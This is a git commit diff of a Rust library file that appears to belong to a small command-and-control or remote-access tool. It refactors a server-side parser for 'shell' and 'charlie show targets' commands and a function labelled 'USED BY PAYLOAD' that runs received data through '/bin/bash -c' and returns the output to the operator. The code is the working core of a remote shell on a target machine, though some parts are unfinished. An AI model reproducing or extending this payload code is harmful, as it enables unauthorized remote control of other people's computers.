218179ec40954116a8b3fa521ad281fbe6c2cf01
godfriedt <60560876+godfriedt@users.noreply.github.com>
2024-05-20 22:05:24 -0500

    Update library.rs

--- src/library.rs
+++ src/library.rs
@@ -1,49 +1,65 @@
-use std::io::Write;
-use std::net::TcpStream;
-use std::str;
-use std::process::{Command, Output};
+use std::{
+    str,
+    process::{Command, Output}
+};
+
 pub struct Target {
     pub stream: std::net::TcpStream,
     pub os: String,
 }
 
-pub fn parse_command_and_write (command: String, stream: &mut TcpStream) {
+pub fn parse_command (command: String) -> String { // USED BY SERVER
     let mut command = command.split(" ");
     let command_type = command.next().unwrap();
+    let data_to_write;
     match command_type {
         "shell" => {
             let shell_command = command.remainder().unwrap().trim();
-            stream.write(shell_command.as_bytes()).unwrap();
+            data_to_write = String::from(shell_command);
         },
         "charlie" => {
             let charlie_command = command.remainder().unwrap().trim();
             match charlie_command {
                 "show targets" => {
-                    charlie_execute_show_targets(stream);
-                    stream.write("\0".as_bytes()).unwrap();
+                    println!("to do");
+                    // charlie_execute_show_targets(stream);
+                    data_to_write = String::from("\0");
                 },
                 _ => todo!()
             };
         },
         _ => {
             println!("{} is not a recognized command.", command_type.trim());
-            stream.write("\0".as_bytes()).unwrap();
+            data_to_write = String::from("\0");
         }
     };
+    return data_to_write
 }
 
-fn charlie_execute_show_targets (stream: &TcpStream) {
-    let targets = stream.peer_addr();
-    match targets {
-        Ok(target) => println!("{target}"),
-        Err(_) => println!("No targets currently exist")
-    };
+// fn charlie_execute_show_targets (stream: &TcpStream) { // USED BY SERVER
+//     let targets = stream.peer_addr();
+//     match targets {
+//         Ok(target) => println!("{target}"),
+//         Err(_) => println!("No targets currently exist")
+//     };
+// }
+
+fn shell_execute_command(data: &[u8]) -> Output { // USED BY PAYLOAD
+    let command = Command::new("/bin/bash")
+        .arg("-c")
+        .arg(str::from_utf8(&data).unwrap())
+        .output()
+        .unwrap();
+
+    return command;
 }
 
-pub fn handle_command_and_write (data: &[u8], connection: &mut std::net::TcpStream) {
-    if (data.len() == 1) && data[0] == 0 {
-        connection.write("\0".as_bytes()).unwrap();
-        connection.flush().unwrap();
+pub fn handle_command_len(data: &[u8]) -> String { // USED BY PAYLOAD
+
+    let data_to_write;
+
+    if (data.len() == 1) && (data[0] == 0) {
+        data_to_write = String::from("\0");
     } else {
         let command = shell_execute_command(data);
 
@@ -52,33 +68,20 @@ pub fn handle_command_and_write (data: &[u8], connection: &mut std::net::TcpStre
             let output = str::from_utf8(&raw).unwrap();
     
             if output.len() > 0 {
-                connection.write(output.as_bytes()).unwrap();
-                connection.flush().unwrap();
+                data_to_write = String::from(output);
             } else {
-                connection.write("\0".as_bytes()).unwrap();
-                connection.flush().unwrap();
+                data_to_write = String::from("\0");
             }
         } else { // catch command error
             let raw = command.stderr;
             let output = str::from_utf8(&raw).unwrap();
     
             if output.len() > 0 {
-                connection.write(output.as_bytes()).unwrap();
-                connection.flush().unwrap();
+                data_to_write = String::from(output);
             } else {
-                connection.write("[UNKNOWN ERROR\n".as_bytes()).unwrap();
-                connection.flush().unwrap();
+                data_to_write = String::from("[UNKNOWN ERROR]\n");
             }
         }
     }
-}
-
-fn shell_execute_command(data: &[u8]) -> Output {
-    let command = Command::new("/bin/bash")
-        .arg("-c")
-        .arg(str::from_utf8(&data).unwrap())
-        .output()
-        .unwrap();
-
-    return command;
+    return data_to_write
 }
